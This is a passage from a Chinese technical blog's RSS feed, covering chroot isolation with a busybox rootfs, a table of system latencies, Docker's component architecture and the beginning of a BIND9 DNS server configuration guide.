docker &lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;docker create busybox&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; busybox.tar

&lt;span class=&quot;c&quot;&gt;# busybox文件解压至rootfs&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xvf&lt;/span&gt; ./busybox.tar &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; ./rootfs
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;操作完成后，进入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootfs&lt;/code&gt;目录，目录下会出现类似宿主系统的目录和文件。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;❯ &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; ./
bin  dev  etc  home  proc  root  sys  tmp  usr  var
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;❯ tree &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 2 ./
./
├── bin
│   ├── &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
│   ├── &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt;
│   ├── acpid
│   ├── addgroup
│   ├── add-shell
│   ├── adduser
......
├── dev
│   ├── console
│   ├── pts
│   └── shm
├── etc
│   ├── group
│   ├── &lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt;
│   ├── hosts
│   ├── localtime
│   ├── mtab -&amp;gt; /proc/mounts
│   ├── network
│   ├── passwd
│   ├── resolv.conf
│   └── shadow
├── home
├── proc
├── root
├── sys
├── tmp
├── usr
│   └── sbin
└── var
    ├── spool
    └── www
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;下面可以通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chroot&lt;/code&gt;切换至准备好的根目录，并启动&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;sudo chroot&lt;/span&gt; ./ /bin/sh
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;执行完毕后，查看根目录，可以看到根目录已经变成了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;busybox&lt;/code&gt;根目录。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-she&quot;&gt;/ # ls
bin   dev   etc   home  proc  root  sys   tmp   usr   var
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;此刻，进程&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;已经与它的父进程在目录空间上隔离开了。&lt;/p&gt;

&lt;h2 id=&quot;3-chroot的隔离局限性&quot;&gt;3 chroot的隔离局限性&lt;/h2&gt;

&lt;p&gt;上文，已经提到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chroot&lt;/code&gt;可以改变进程的根目录，那么其它内核资源（如网络、PID等）是否隔离？&lt;/p&gt;

&lt;p&gt;如下是在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;（&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chroot&lt;/code&gt;启动的子进程）输出的网络信息。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;/ &lt;span class=&quot;c&quot;&gt;# ip addr&lt;/span&gt;
1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue qlen 1000
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eno1: &amp;lt;NO-CARRIER,BROADCAST,MULTICAST,UP&amp;gt; mtu 1500 qdisc fq_codel qlen 1000
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/ether c4:34:6b:02:34:dd brd ff:ff:ff:ff:ff:ff
3: wlo1: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc mq qlen 1000
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/ether 00:71:cc:22:cc:bb brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.142/24 brd 192.168.2.255 scope global dynamic noprefixroute wlo1
       valid_lft 42010sec preferred_lft 42010sec
    inet6 fe80::5ce6:a689:8d04:a0b3/64 scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;noprefixroute
       valid_lft forever preferred_lft forever
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如下实在宿主系统下输出的网络信息。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;❯ ip addr
1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eno1: &amp;lt;NO-CARRIER,BROADCAST,MULTICAST,UP&amp;gt; mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/ether c4:34:6b:02:34:dd brd ff:ff:ff:ff:ff:ff
    altname enp14s0
3: wlo1: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc mq state UP group default qlen 1000
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/ether 00:71:cc:22:cc:bb brd ff:ff:ff:ff:ff:ff
    altname wlp7s0f0
    inet 192.168.2.142/24 brd 192.168.2.255 scope global dynamic noprefixroute wlo1
       valid_lft 41641sec preferred_lft 41641sec
    inet6 fe80::5ce6:a689:8d04:a0b3/64 scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;noprefixroute
       valid_lft forever preferred_lft forever
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过对比，可以发现网络没有隔离。&lt;/p&gt;

&lt;p&gt;接下来，对比PID有没有隔离。由于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;需要执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps&lt;/code&gt;依赖&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;procfs&lt;/code&gt;，所以需要先挂载&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc&lt;/code&gt;目录，操作命令如下。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-she&quot;&gt;mount -t proc proc /proc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps&lt;/code&gt;命令后，可以看到全部宿主系统的进程。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;PID   USER     TIME  COMMAND
    1 root      0:01 &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;systemd&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; /sbin/init
    2 root      0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kthreadd]
    3 root      0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rcu_gp]
    4 root      0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rcu_par_gp]
    8 root      0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mm_percpu_wq]
    ......
13806 1000      0:00 alacritty
13808 1000      0:01 /usr/bin/zsh
13817 1000      0:00 /usr/bin/zsh
13910 1000      0:00 /usr/bin/zsh
13911 1000      0:00 /usr/bin/zsh
13913 1000      0:00 /usr/share/zsh-theme-powerlevel10k/gitstatus/usrbin/gitstatusd
13945 root      0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/0:1H]
13954 root      0:00 ps
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;综上，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chroot&lt;/code&gt;的确只隔离了根目录，其它内核资源并未涉及。&lt;/p&gt;
</description>
        <pubDate>Tue, 15 Mar 2022 00:00:00 +0800</pubDate>
        <link>https://cheneyyin.github.io/2022/03/15/chroot/</link>
        <guid isPermaLink="true">https://cheneyyin.github.io/2022/03/15/chroot/</guid>
        
        <category>chroot</category>
        
        <category>Linux</category>
        
        <category>busybox</category>
        
        <category>docker</category>
        
        <category>隔离</category>
        
        
      </item>
    
      <item>
        <title>计算机系统各类延时概况</title>
        <description>&lt;h1 id=&quot;计算机系统各类延时概况&quot;&gt;计算机系统各类延时概况&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;事件&lt;/th&gt;
      &lt;th&gt;延时&lt;/th&gt;
      &lt;th&gt;相对时间比例&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1个CPU周期&lt;/td&gt;
      &lt;td&gt;0.3 ns&lt;/td&gt;
      &lt;td&gt;1 s&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;L1缓存访问&lt;/td&gt;
      &lt;td&gt;0.9 ns&lt;/td&gt;
      &lt;td&gt;3 s&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;L2缓存访问&lt;/td&gt;
      &lt;td&gt;2.8 ns&lt;/td&gt;
      &lt;td&gt;9 s&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;L3缓存访问&lt;/td&gt;
      &lt;td&gt;12.9 ns&lt;/td&gt;
      &lt;td&gt;43 s&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;主存访问（从CPU访问DRAM）&lt;/td&gt;
      &lt;td&gt;120 ns&lt;/td&gt;
      &lt;td&gt;6 分钟&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;固态硬盘I/O（闪存）&lt;/td&gt;
      &lt;td&gt;50-150 us&lt;/td&gt;
      &lt;td&gt;2-6 天&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;旋转磁盘I/O&lt;/td&gt;
      &lt;td&gt;1-10 ms&lt;/td&gt;
      &lt;td&gt;1-12 月&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;互联网：从旧金山到纽约&lt;/td&gt;
      &lt;td&gt;40 ms&lt;/td&gt;
      &lt;td&gt;4 年&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;互联网：从旧金山到英国&lt;/td&gt;
      &lt;td&gt;81 ms&lt;/td&gt;
      &lt;td&gt;8 年&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;互联网：从旧金山到澳大利亚&lt;/td&gt;
      &lt;td&gt;183 ms&lt;/td&gt;
      &lt;td&gt;19 年&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;TCP包重传&lt;/td&gt;
      &lt;td&gt;1-3 s&lt;/td&gt;
      &lt;td&gt;105-317 年&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;OS虚拟化系统重启&lt;/td&gt;
      &lt;td&gt;4 s&lt;/td&gt;
      &lt;td&gt;423 年&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SCSI命令超时&lt;/td&gt;
      &lt;td&gt;30 s&lt;/td&gt;
      &lt;td&gt;3 千年&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;硬件虚拟化系统重启&lt;/td&gt;
      &lt;td&gt;40 s&lt;/td&gt;
      &lt;td&gt;4 千年&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;物理系统重启&lt;/td&gt;
      &lt;td&gt;5 m&lt;/td&gt;
      &lt;td&gt;32 千年&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

</description>
        <pubDate>Fri, 11 Feb 2022 00:00:00 +0800</pubDate>
        <link>https://cheneyyin.github.io/2022/02/11/latency-summary/</link>
        <guid isPermaLink="true">https://cheneyyin.github.io/2022/02/11/latency-summary/</guid>
        
        <category>latency</category>
        
        <category>memory</category>
        
        <category>cpu</category>
        
        <category>cache</category>
        
        <category>network packet</category>
        
        
      </item>
    
      <item>
        <title>Docker组件架构</title>
        <description>&lt;h1 id=&quot;docker组件架构&quot;&gt;Docker组件架构&lt;/h1&gt;

&lt;h2 id=&quot;总概&quot;&gt;总概&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;组件类别&lt;/th&gt;
      &lt;th&gt;组件&lt;/th&gt;
      &lt;th&gt;介绍&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;docker相关组件&lt;/td&gt;
      &lt;td&gt;docker&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;docker&lt;/strong&gt;客户端，负责发送&lt;strong&gt;docker&lt;/strong&gt;操作请求。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;同上&lt;/td&gt;
      &lt;td&gt;dockerd&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;docker&lt;/strong&gt;服务入口，负责接受客户端请求并返回请求结果。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;同上&lt;/td&gt;
      &lt;td&gt;docker-init&lt;/td&gt;
      &lt;td&gt;当业务主进程没有回收能力时，docker-init可以作为容器的1号进程，负责管理容器内的子进程。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;同上&lt;/td&gt;
      &lt;td&gt;docker-proxy&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;docker&lt;/strong&gt;的网络实现，通过设置&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables&lt;/code&gt;规则使得访问主机的流量可以发送至容器内。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;containerd相关&lt;/td&gt;
      &lt;td&gt;containerd&lt;/td&gt;
      &lt;td&gt;负责管理容器的生命周期， 通过接收dockerd的请求，执行启动或者销毁容器。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;同上&lt;/td&gt;
      &lt;td&gt;contianerd-shim&lt;/td&gt;
      &lt;td&gt;将containerd和真正的容器进程解耦。使用containerd-shim作为容器的父进程，可以实现重启containerd而不影响已经启动的容器进程。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;同上&lt;/td&gt;
      &lt;td&gt;ctr&lt;/td&gt;
      &lt;td&gt;containerd的客户端， 可以向containerd发送容器请求，主要用来调试开发。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;容器运行时组件&lt;/td&gt;
      &lt;td&gt;runc&lt;/td&gt;
      &lt;td&gt;命令行工具，通过调用&lt;strong&gt;namespace&lt;/strong&gt;、&lt;strong&gt;cgroup&lt;/strong&gt;等系统接口，实现容器的创建和销毁。&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;center&gt;
    &lt;img style=&quot;border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);&quot; src=&quot;/img/resources/docker-arch.svg&quot; width=&quot;75%&quot; alt=&quot;&quot; /&gt;
    &lt;br /&gt;
    &lt;div style=&quot;color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;&quot;&gt;
      图1 docker组建架构
  	&lt;/div&gt;
&lt;/center&gt;
</description>
        <pubDate>Mon, 17 Jan 2022 00:00:00 +0800</pubDate>
        <link>https://cheneyyin.github.io/2022/01/17/docker-component/</link>
        <guid isPermaLink="true">https://cheneyyin.github.io/2022/01/17/docker-component/</guid>
        
        <category>Docker</category>
        
        <category>dockerd</category>
        
        <category>docker-init</category>
        
        <category>docker-proxy</category>
        
        <category>containerd</category>
        
        <category>containerd-shim</category>
        
        <category>ctr</category>
        
        <category>runc</category>
        
        
      </item>
    
      <item>
        <title>DNS服务与配置</title>
        <description>&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nslookup&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsupdate&lt;/code&gt;用于查询和更新域名。&lt;/p&gt;

&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsupdate&lt;/code&gt;要配合&lt;strong&gt;bind&lt;/strong&gt;服务器使用。&lt;/p&gt;

&lt;h1 id=&quot;1-bind域名服务器简易配置&quot;&gt;1 &lt;strong&gt;bind&lt;/strong&gt;域名服务器简易配置&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://wiki.ubuntu.org.cn/Bind9%E5%AE%89%E8%A3%85%E8%AE%BE%E7%BD%AE%E6%8C%87%E5%8D%97#HOWTO_Setup_BIND9_DNS_Server_.EF.BC.88.E5.A6.82.E4.BD.95.E5.AE.89.E8.A3.85.E8.AE.BE.E7.BD.AEBind9_DNS.E6.9C.8D.E5.8A.A1.E5.99.A8.EF.BC.89&quot;&gt;参考&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接下来，将说明如何在&lt;strong&gt;Ubuntu 20.04.1 LTS&lt;/strong&gt;安装配置&lt;strong&gt;bind&lt;/strong&gt;。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;apt &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; bind9
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;安装相关工具，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;apt &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; dnsutils bind9-host
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;配置&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/bind/named.conf&lt;/code&gt;。如下为示例文件内容：&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;// this configuration file.
//
// If you are just adding zones, please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;that &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /etc/bind/named.conf.local

include &lt;span class=&quot;s2&quot;&gt;&quot;/etc/bind/named.conf.options&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
include &lt;span class=&quot;s2&quot;&gt;&quot;/etc/bind/named.conf.local&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
include &lt;span class=&quot;s2&quot;&gt;&quot;/etc/bind/named.conf.default-zones&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

logging &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
	channel access_log &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		file &lt;span class=&quot;s2&quot;&gt;&quot;/var/log/named.log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		severity dynamic&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		print-category &lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		print-severity &lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		print-time &lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	category default &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		access_log&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

zone &lt;span class=&quot;s2&quot;&gt;&quot;etcd.com&quot;&lt;/span&gt; IN &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;master&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	file &lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/bind/db.etcd.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	allow-query &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		any&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	allow-update &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		any&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该文件中配置了两部分&lt;a href=&quot;http://www.hangdaowangluo.com/archives/1615&quot;&gt;日志&lt;/a&gt;及区域两部分内容，其中区域部分更加规范的方法实在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/bind/named.conf.local&lt;/code&gt;配置。这里，配置了名为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etcd.com&lt;/code&gt;的区域，它允许任意查询和更新，其数据文件为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/bind/db.etcd.com&lt;/code&gt;，如下是示例内容。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nv&quot;&gt;$TTL&lt;/span&gt; 604800	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 1 week
@		IN SOA	dns.etcd.com. admin.etcd.com. &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
				100000     &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; serial
				604800     &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; refresh &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 week&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
